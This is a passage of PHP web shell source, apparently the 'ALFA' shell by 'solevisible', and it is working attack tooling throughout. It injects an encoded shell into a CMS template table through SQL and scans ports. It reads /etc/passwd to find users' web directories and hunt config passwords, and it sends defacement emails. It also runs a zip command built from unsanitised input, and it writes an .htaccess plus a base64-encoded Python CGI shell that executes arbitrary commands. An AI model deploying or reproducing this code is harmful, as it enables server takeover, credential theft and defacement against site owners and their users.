kQ0lnWlc1amRIbHdaVDBpYlhWc2RHbHdZWEowTDJadmNtMHRaR0YwWVNJZ2JtRnRaVDBpZFhCc2IyRmtaWElpSUEwS2FXUTlJblZ3Ykc5aFpHVnlJajRuT3cwS0lHVmphRzhnSnp4cGJuQjFkQ0IwZVhCbFBTSm1hV3hsSWlCdVlXMWxQU0ptYVd4bElpQnphWHBsUFNJME5TSStQR2x1Y0hWMElHNWhiV1U5SWw5MWNHd2lJSFI1Y0dVOUluTjFZbTFwZENJZ0RRcHBaRDBpWDNWd2JDSWdkbUZzZFdVOUlsVndiRzloWkNJK1BDOW1iM0p0UGp3dlkyVnVkR1Z5UGljN0RRb2dhV1lvSUNSZlVFOVRWRnNuWDNWd2JDZGRJRDA5SUNKVmNHeHZZV1FpSUNrZ2V3MEtJR2xtS0VCamIzQjVLQ1JmUmtsTVJWTmJKMlpwYkdVblhWc25kRzF3WDI1aGJXVW5YU3dnSkY5R1NVeEZVMXNuWm1sc1pTZGRXeWR1WVcxbEoxMHBLU0I3SUdWamFHOGdEUW9uUEdJK1BHWnZiblFnWTI5c2IzSTlYQ0lqTjBOR1F6QXdYQ0krUEdObGJuUmxjajVWY0d4dllXUWdVM1ZqWTJWemMyWjFiR3g1SURzcFBDOW1iMjUwUGp3dllUNDhabTl1ZENCamIyeHZjajFjSWlNM1EwWkRNREJjSWo0OEwySStQR0p5UGp4aWNqNG5PeUI5RFFvZ0lDQWdJR1ZzYzJVZ2V5QmxZMmh2SUNjOFlqNDhabTl1ZENCamIyeHZjajFjSWlNM1EwWkRNREJjSWo0OFkyVnVkR1Z5UGxWd2JHOWhaQ0JtWVdsc1pXUWdPaWc4TDJadmJuUStQQzloUGp4bWIyNTBJR052Ykc5eVBWd2lJemREUmtNd01Gd2lQand2WWo0TkNqeGljajQ4WW5JK0p6c2dmUTBLSUgwTkNqOCtEUW84WTJWdWRHVnlQanh6Y0dGdUlITjBlV3hsUFNKbWIyNTBMWE5wZW1VNk16QndlRHNpUGp4emNHRnVJSE4wZVd4bFBTSmlZV05yWjNKdmRXNWtPaUIxY213b0puRjFiM1E3YUhSMGNEb3ZMM1Z3TG1seVlXNHRkR0ZzYXk1cGNpOTFjR3h2WVdSekx6RXpNekUxTnpFeE5Ea3pMbWRwWmlaeGRXOTBPeWtnY21Wd1pXRjBMWGdnYzJOeWIyeHNJREFsSURBbElIUnlZVzV6Y0dGeVpXNTBPeUJqYjJ4dmNqb2djbVZrT3lCMFpYaDBMWE5vWVdSdmR6b2dPSEI0SURod2VDQXhNM0I0T3lJK1BITjBjbTl1Wno0OFlqNDhZbWxuUG5OdmJHVjJhWE5wWW14bFFHZHRZV2xzTG1OdmJUd3ZZajQ4TDJKcFp6NDhMM04wY205dVp6NE5DZz09JzsgJGZwID0gZm9wZW4oInNvbGV2aXNpYmxlLnBocCIsIncrIik7IGZ3cml0ZSgkZnAsYmFzZTY0X2RlY29kZSgkY29kZSkpOyBoZWFkZXIoIkxvY2F0aW9uOiBzb2xldmlzaWJsZS5waHAiKTs=\'))}}{\${exit()}}&";
$template =$_POST['alfa1'];
@mysql_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5']) or die(mysql_error());
@mysql_select_db($_POST['alfa3']) or die(mysql_error());
$p = "UPDATE ".$_POST['alfa6']."template SET template ='".$code."' WHERE title ='".$template."'";
$ka= @mysql_query($p) or die(mysql_error());
if ($ka){echo"<script>alert('Shell Injected in $template')</script>";}
}
echo "</div>";
alfafooter();
}
function alfaportscanner(){
alfahead();
echo '<div class=header><script>alfa2_=alfa3_=alfa4_="";</script><center><br><b><font color="#FFFFFF">Port Scaner<font></b><br>
<br><br><form action="" method="post" onsubmit="g(\'portscanner\',null,null,this.start.value,this.end.value,this.host.value); return false;">
<input type="hidden" name="y" value="phptools">
<b><font color="#00A220"> Host: <br /><br />
<input id="text" type="text" style="color:#FF0000;background-color:#000000" name="host" value="localhost"/><br /><br />
<b><font id="text" color="#FFFFFF"> Port start: <br />
<input id="text" type="text" style="color:#FF0000;background-color:#000000" name="start" value="0"/><br /><br />
<b><font color="#FF0000"> Port end: <br />
<input id="text" type="text" style="color:#FF0000;background-color:#000000" name="end" value="1000"/><br /><br />
<input type="submit" value=">>" />
</form></center><br><br>
';
$start = strip_tags($_POST['alfa2']);
$end = strip_tags($_POST['alfa3']);
$host = strip_tags($_POST['alfa4']);
if(isset($_POST['alfa4']) && is_numeric($_POST['alfa3']) && is_numeric($_POST['alfa2'])){
echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br/>';
for($i = $start; $i<=$end; $i++){
$fp = @fsockopen($host, $i, $errno, $errstr, 3);
if($fp){
echo "<center>Port <font style='color:#DE3E3E'>$i</font> is <font style='color:#64CF40'>open</font></br></center>";
}
flush();
}
}
echo '</div>';
alfafooter();
}
function alfabasedir(){
alfahead();
echo '<div class=header>';
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<b> <center><font color="#FFFFFF">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 35)
{
$pos = strpos($str,':');
$username = substr($str,0,$pos);
$dirz = '/home/'.$username.'/public_html/';
if (($username != ''))
{
if (is_readable($dirz))
{
array_push($users,$username);
array_push($pub,$dirz);
}
}
}
$i++;
}
echo '<br><br>';
echo "<b><font color=\"#00A220\">[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br /></font></b>";
echo "<b><font color=\"#FFFFFF\">[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br /></font></b>";
echo "<b><font color=\"#FF0000\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
foreach ($users as $user)
{
$path = "/home/$user/public_html/";
echo "<form method=post onsubmit='g('FilesMan',this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
echo '<br><br></b>';
echo '</div>';
alfafooter();
}
function alfamail(){
alfahead();
echo '<div class=header><br><br>';
echo '
<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_="";</script>
<center><form action="" method="post" onsubmit="g(\'mail\',null,this.mail_to.value,this.mail_from.value,this.mail_subject.value,this.mail_send.value,this.mail_content.value); return false;">
<table border=1>
<tr>
<td>
<font color="#00A220"><b>mail to : </b></font></td><td><input placeholder="target" size="30" type="text" name="mail_to" />
</td>
</tr>
<tr>
<td>
<font color="#ffffff"><b>from : </b></font></td><td><input type="text" size="30" placeholder="solevisible@gmail.com" name="mail_from" />
</td>
</tr>
<tr>
<td>
<font color="#FF0000"><b>subject : </b></font></td><td><input type="text" size="30" value="your site hacked by me" name="mail_subject" />
</td>
</tr>
</table><br>
<textarea rows="6" cols="60" name="mail_content">Hi Dear Admin :)</textarea>
<br><input type="submit" value=">>" name="mail_send" />
</form></center><br><br></div>';
alfafooter();
if(isset($_POST['alfa4']) && ($_POST['alfa4'] == '>>'))
{
$mail_to = $_POST['alfa1'];
$mail_from = $_POST['alfa2'];
$mail_subject = $_POST['alfa3'];
$mail_content = $_POST['alfa5'];
if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from"))
{ echo '<script>alert(\'mail sended\')</script>'; }
else echo '<script>alert(\'failed\')</script>';
}
}
function alfaziper(){
alfahead();
echo '<div class=header>';
if (class_exists('ZipArchive')){
echo '
<script>alfa1_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_="";</script>
<center>
<br /><br />
<form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,this.ziper.value);return false;" method="post">
<font color="#FFFFFF"><b>Dir:</b> </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="dirzip" value="'.htmlspecialchars($GLOBALS['cwd']).'" size="60"/><br /><br />
<font color="#FFFFFF"><b>Save Dir: </b></font><input type="text" name="zipfile" value="alfa.zip" size="60"/><br /><br />
<input type="submit" value=">>" name="ziper" /> <br /><br />
</form></center>
';
$code = base64_decode('ICAgIGlmICghZXh0ZW5zaW9uX2xvYWRlZCgnemlwJykgfHwgIWZpbGVfZXhpc3RzKCRzb3VyY2UpKSB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsNCiAgICBpZiAoISR6aXAtPm9wZW4oJGRlc3RpbmF0aW9uLCBaSVBBUkNISVZFOjpDUkVBVEUpKSB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAkc291cmNlID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCByZWFscGF0aCgkc291cmNlKSk7DQoNCiAgICBpZiAoaXNfZGlyKCRzb3VyY2UpID09PSB0cnVlKQ0KICAgIHsNCiAgICAgICAgJGZpbGVzID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IobmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCRzb3VyY2UpLCBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yOjpTRUxGX0ZJUlNUKTsNCg0KICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpDQogICAgICAgIHsNCiAgICAgICAgICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkZmlsZSk7DQoNCiAgICAgICAgICAgIC8vIElnbm9yZSAiLiIgYW5kICIuLiIgZm9sZGVycw0KICAgICAgICAgICAgaWYoIGluX2FycmF5KHN1YnN0cigkZmlsZSwgc3RycnBvcygkZmlsZSwgJy8nKSsxKSwgYXJyYXkoJy4nLCAnLi4nKSkgKQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KDQogICAgICAgICAgICAkZmlsZSA9IHJlYWxwYXRoKCRmaWxlKTsNCg0KICAgICAgICAgICAgaWYgKGlzX2RpcigkZmlsZSkgPT09IHRydWUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJHppcC0+YWRkRW1wdHlEaXIoc3RyX3JlcGxhY2UoJHNvdXJjZSAuICcvJywgJycsICRmaWxlIC4gJy8nKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChpc19maWxlKCRmaWxlKSA9PT0gdHJ1ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkemlwLT5hZGRGcm9tU3RyaW5nKHN0cl9yZXBsYWNlKCRzb3VyY2UgLiAnLycsICcnLCAkZmlsZSksIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSBpZiAoaXNfZmlsZSgkc291cmNlKSA9PT0gdHJ1ZSkNCiAgICB7DQogICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoYmFzZW5hbWUoJHNvdXJjZSksIGZpbGVfZ2V0X2NvbnRlbnRzKCRzb3VyY2UpKTsNCiAgICB9DQoNCiAgICByZXR1cm4gJHppcC0+Y2xvc2UoKTs=');
if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>'))
{
$newfunc = create_function('$source,$destination', $code);
$dirzip = $_POST['alfa3'];
$zipfile = $_POST['alfa4'];
if($newfunc($dirzip, $zipfile)){
echo '<pre id="strOutput" style="margin-top:8px" class="ml1"><br/><center><b><b><font color="#FFFF01">==</font> <font color="#00A220">File or</font> <font color="#FFFFFF">Directory</font> <font color="#FF0000">Ziped</font><font color="#FFFF01"> ==</font></b>
</b></center>';
}else {echo '<pre id="strOutput" style="margin-top:8px" class="ml1"><br/><center><b>ERROR!!!...</b><center><br><br>';}
}
}
else {
echo '
<script>alfa1_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_="";</script>
<center>
<br /><br />
<form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,this.ziper.value);return false;" method="post">
Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="dirzip" value="'.htmlspecialchars($GLOBALS['cwd']).'" size="60"/><br /><br />
Save Dir: <input type="text" name="zipfile" value="alfa.zip" size="60"/><br /><br />
<input type="submit" value=">>" name="ziper" /> <br /><br />
</form></center>
';
if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>'))
{
$dirzip = trim($_POST['alfa3']);
$zipfile = trim($_POST['alfa4']);
if(exec("zip -r $zipfile $dirzip")){
echo '<pre id="strOutput" style="margin-top:8px" class="ml1"><br/><center><b><center><b><b><font color="#FFFF01">==</font> <font color="#00A220">File or</font> <font color="#FFFFFF">Directory</font> <font color="#FF0000">Ziped</font><font color="#FFFF01"> ==</font></b>
</b></center></b></center><br><br>';
}else {echo '<pre id="strOutput" style="margin-top:8px" class="ml1"><br/><center><b>ERROR!!!...</b><center><br><br>';}
}
}
echo '</div>';
alfafooter();
}
function alfacgipython()
{
alfahead();
echo '<div class=header>';
mkdir('cgipy',0755);
chdir('cgipy');
$solevisible7 = '.htaccess';
$solevisible6 = "$solevisible7";
$solevisible4 = fopen ($solevisible6 ,'w') or die ('ERROR!!!');
$solevisible5 = 'AddHandler cgi-script .izo';
fwrite ( $solevisible4 ,$solevisible5 ) ;
fclose ($solevisible4);
$solevisible3 = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';
$solevisible1 = fopen('py.izo','w+');
$solevisible2 = fwrite ($solevisible1 ,base64_decode($solevisible3));
fclose($solevisible1);
chmod('py.izo',0755);
echo '<iframe src=cgipy/py.izo width=100% height=600px frameborder=0></iframe> ';
echo "</div>";
alfafooter();
}
if( empty($_POST['a']) )
if(isset($default_action) && function_exists('alfa' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('alfa' . $_POST['a']) )
call_user_func('alfa' . $_POST['a']);
exit;